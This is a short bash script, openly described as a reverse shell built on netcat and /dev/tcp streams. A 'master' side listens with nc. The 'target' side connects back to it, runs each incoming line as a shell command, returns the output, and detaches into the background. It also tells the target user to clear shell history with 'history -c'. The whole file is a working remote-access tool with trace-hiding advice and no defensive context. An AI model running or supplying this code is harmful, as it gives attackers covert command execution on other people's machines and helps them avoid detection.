#!/bin/bash

#reverse shell in bash using netcat and streams

echo Set Master First!
echo Your IP : `hostname -I | awk '{print $1}'`
echo LPORT?
read LPORT
echo Master IP?
read IP

master() {
  nc -l ${LPORT}
}

target() {
  exec 5<>/dev/tcp/${IP}/${LPORT}
  cat <&5 |
  while read line; do
  $line >&5; done &
  disown
}

echo are you master or target? m/t
read MT

mastertarget() {
  if [ "${MT}" = "m" ]; then
    clear
    echo Leave this open, type commands in after you set the target
    master
  elif [ ${MT} = "t" ]; then
    clear
    echo Try running "history -c"  
    echo It is safe to close this terminal now
    target
  else
    echo type m or t
    mastertarget
  fi
}

mastertarget
